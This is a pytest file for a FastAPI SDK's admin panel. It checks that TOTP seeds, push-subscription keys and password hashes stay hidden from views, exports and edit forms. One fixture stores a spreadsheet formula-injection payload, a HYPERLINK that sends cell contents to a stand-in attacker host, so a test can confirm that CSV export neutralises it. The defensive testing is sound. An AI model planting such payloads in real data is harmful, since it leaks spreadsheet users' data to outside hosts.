"""The SDK's own credential columns stay off the admin without configuration.

``MFAMixin.totp_secret`` and the push subscription's ``endpoint`` /
``p256dh`` / ``auth`` are declared in ``__secret_columns__``, so a plain
``AdminModel(model=...)`` hides them from every read surface and the audit
redacts them — the same treatment ``hashed_password`` always had. The
required ones stay writable on the create form, which starts blank. Also
covers the parent inline of a child with no registered admin, and the CSV
export neutralizing a cell a spreadsheet would evaluate.
"""

from __future__ import annotations

import csv
import io
import re
from collections.abc import AsyncIterator
from dataclasses import dataclass
from typing import Any
from uuid import UUID

import pytest
from fastapi import FastAPI
from httpx import ASGITransport, AsyncClient
from sqlalchemy import ForeignKey, String, Uuid, select
from sqlalchemy.orm import Mapped, mapped_column

from tempest_fastapi_sdk import (
    AdminModel,
    AdminPermissionEnum,
    AdminSite,
    AsyncDatabaseManager,
    BaseModel,
    BaseUserModel,
    BaseWebPushSubscriptionModel,
    Inline,
    MFAMixin,
    UserModelAuthBackend,
    make_admin_router,
)
from tempest_fastapi_sdk.db.audit import audit_redacted_columns
from tempest_fastapi_sdk.testing import admin_login

SECRET = "x" * 48
SEED = "SECRETSEEDJBSWY3DPEHPK3PXQ"
ENDPOINT = "https://push.example.invalid/endpoint-token-123"
AUTH = "auth-secret-xyz"
P256 = "p256dh-key-abc"
FORMULA = '=HYPERLINK("http://evil.invalid/?x="&A1,"x")'


class SecUser(BaseUserModel, MFAMixin):
    __tablename__ = "admin_secret_users"
    role: Mapped[str] = mapped_column(String(32), nullable=False, default="viewer")


class SecSub(BaseWebPushSubscriptionModel):
    __tablename__ = "admin_secret_subs"
    user_id: Mapped[UUID] = mapped_column(
        Uuid(), ForeignKey("admin_secret_users.id"), nullable=False, index=True
    )


class SecOrg(BaseModel):
    __tablename__ = "admin_secret_org"
    name: Mapped[str] = mapped_column(String(128), nullable=False)


class SecAgent(BaseUserModel):
    __tablename__ = "admin_secret_agents"
    org_id: Mapped[UUID] = mapped_column(
        Uuid(), ForeignKey("admin_secret_org.id"), nullable=False
    )


def _policy(user: Any, admin: AdminModel[Any], action: AdminPermissionEnum) -> bool:
    """Grant everything to ``super`` and only ``VIEW`` to the viewer.

    Args:
        user (Any): The principal.
        admin (AdminModel[Any]): The admin asked about.
        action (AdminPermissionEnum): The action.

    Returns:
        bool: Whether the action is allowed.
    """
    return bool(user.role == "super" or action is AdminPermissionEnum.VIEW)


@dataclass
class Seeded:
    """Row identifiers the tests address.

    Attributes:
        admin_id (str): The super user's id.
        sub_id (str): The subscription id.
        org_id (str): The organization id.
        agent_hash (str): The unregistered inline child's password digest.
    """

    admin_id: str
    sub_id: str
    org_id: str
    agent_hash: str


@pytest.fixture
async def app_secrets() -> AsyncIterator[tuple[FastAPI, AsyncDatabaseManager, Seeded]]:
    db = AsyncDatabaseManager("sqlite+aiosqlite:///:memory:")
    await db.connect()
    await db.create_tables()
    async with db.get_session_context() as session:
        boss = SecUser(email="super@x.com", is_admin=True, role="super")
        boss.set_password("pw")
        boss.totp_secret = SEED
        viewer = SecUser(email="viewer@x.com", is_admin=True, role="viewer")
        viewer.set_password("pw")
        org = SecOrg(name=FORMULA)
        session.add_all([boss, viewer, org])
        await session.flush()
        sub = SecSub(user_id=boss.id, endpoint=ENDPOINT, p256dh=P256, auth=AUTH)
        agent = SecAgent(email="agent@x.com", org_id=org.id)
        agent.set_password("agent-pw")
        session.add_all([sub, agent])
        await session.commit()
        seeded = Seeded(str(boss.id), str(sub.id), str(org.id), agent.hashed_password)

    site = AdminSite(title="Secrets")
    site.register(AdminModel(model=SecUser))
    site.register(AdminModel(model=SecSub))
    site.register(AdminModel(model=SecOrg, inlines=[Inline(SecAgent, "org_id")]))
    app = FastAPI()
    app.include_router(
        make_admin_router(
            site,
            db=db,
            auth_backend=UserModelAuthBackend(SecUser),
            secret_key=SECRET,
            cookie_secure=False,
            access_policy=_policy,
        )
    )
    yield app, db, seeded
    await db.drop_tables()
    await db.disconnect()


def _client(app: FastAPI) -> AsyncClient:
    return AsyncClient(transport=ASGITransport(app=app), base_url="http://test")


class TestDeclaration:
    def test_mixin_secret_survives_base_order(self) -> None:
        assert "totp_secret" in SecUser.get_secret_columns()
        assert AdminModel(model=SecUser).hidden_field_names() >= {
            "hashed_password",
            "totp_secret",
        }

    def test_audit_redacts_declared_secrets(self) -> None:
        assert {"endpoint", "p256dh", "auth"} <= audit_redacted_columns(SecSub)
        assert "totp_secret" in audit_redacted_columns(SecUser)

    def test_required_secrets_are_create_only(self) -> None:
        admin = AdminModel(model=SecSub)
        assert admin.insertable_secret_names() == {"endpoint", "p256dh", "auth"}
        assert {"endpoint", "p256dh", "auth"}.isdisjoint(admin.editable_field_names())
        assert {"endpoint", "p256dh", "auth"} <= set(
            admin.editable_field_names(creating=True)
        )
        assert "totp_secret" not in AdminModel(model=SecUser).editable_field_names(
            creating=True
        )


class TestReadSurfaces:
    @pytest.mark.asyncio
    async def test_viewer_never_reads_the_seed_or_push_secrets(
        self, app_secrets: tuple[FastAPI, AsyncDatabaseManager, Seeded]
    ) -> None:
        app, _, seeded = app_secrets
        users = f"/admin/m/{SecUser.__tablename__}"
        subs = f"/admin/m/{SecSub.__tablename__}"
        async with _client(app) as client:
            await admin_login(client, "viewer@x.com", "pw")
            pages = {
                "users list": await client.get(f"{users}/"),
                "users detail": await client.get(f"{users}/{seeded.admin_id}"),
                "users csv": await client.get(f"{users}/export.csv"),
                "users json": await client.get(f"{users}/export.json"),
                "subs list": await client.get(f"{subs}/"),
                "subs detail": await client.get(f"{subs}/{seeded.sub_id}"),
                "subs csv": await client.get(f"{subs}/export.csv"),
            }
        for name, resp in pages.items():
            assert resp.status_code == 200, name
            for secret in (SEED, ENDPOINT, AUTH, P256):
                assert secret not in resp.text, (name, secret)

    @pytest.mark.asyncio
    async def test_edit_form_does_not_prefill_secrets(
        self, app_secrets: tuple[FastAPI, AsyncDatabaseManager, Seeded]
    ) -> None:
        app, _, seeded = app_secrets
        async with _client(app) as client:
            await admin_login(client, "super@x.com", "pw")
            user_form = await client.get(
                f"/admin/m/{SecUser.__tablename__}/{seeded.admin_id}/edit"
            )
            sub_form = await client.get(
                f"/admin/m/{SecSub.__tablename__}/{seeded.sub_id}/edit"
            )
        assert user_form.status_code == 200
        assert sub_form.status_code == 200
        assert SEED not in user_form.text
        for secret in (ENDPOINT, AUTH, P256):
            assert secret not in sub_form.text

    @pytest.mark.asyncio
    async def test_unregistered_inline_child_hides_password_digest(
        self, app_secrets: tuple[FastAPI, AsyncDatabaseManager, Seeded]
    ) -> None:
        app, _, seeded = app_secrets
        async with _client(app) as client:
            await admin_login(client, "super@x.com", "pw")
            resp = await client.get(f"/admin/m/{SecOrg.__tablename__}/{seeded.org_id}")
        assert resp.status_code == 200
        assert "agent@x.com" in resp.text
        assert seeded.agent_hash not in resp.text


class TestCreateStillWorks:
    @pytest.mark.asyncio
    async def test_subscription_can_be_created_with_blank_secret_inputs(
        self, app_secrets: tuple[FastAPI, AsyncDatabaseManager, Seeded]
    ) -> None:
        app, db, seeded = app_secrets
        url = f"/admin/m/{SecSub.__tablename__}/new"
        async with _client(app) as client:
            await admin_login(client, "super@x.com", "pw")
            form = await client.get(url)
            match = re.search(r'name="csrf_token" value="([^"]+)"', form.text)
            assert match is not None
            resp = await client.post(
                url,
                data={
                    "csrf_token": match.group(1),
                    "user_id": seeded.admin_id,
                    "endpoint": "https://push.example.invalid/new",
                    "p256dh": "k",
                    "auth": "a",
                },
            )
        assert form.status_code == 200
        assert 'name="endpoint"' in form.text
        assert resp.status_code == 303
        async with db.get_session_context() as session:
            rows = (await session.execute(select(SecSub))).scalars().all()
        assert sorted(row.endpoint for row in rows) == sorted(
            [ENDPOINT, "https://push.example.invalid/new"]
        )


class TestCsvExport:
    @pytest.mark.asyncio
    async def test_formula_cells_are_written_as_text(
        self, app_secrets: tuple[FastAPI, AsyncDatabaseManager, Seeded]
    ) -> None:
        app, _, _ = app_secrets
        async with _client(app) as client:
            await admin_login(client, "super@x.com", "pw")
            exported = await client.get(f"/admin/m/{SecOrg.__tablename__}/export.csv")
            as_json = await client.get(f"/admin/m/{SecOrg.__tablename__}/export.json")
        rows = list(csv.DictReader(io.StringIO(exported.text)))
        assert rows[0]["name"] == f"'{FORMULA}"
        assert as_json.json()[0]["name"] == FORMULA
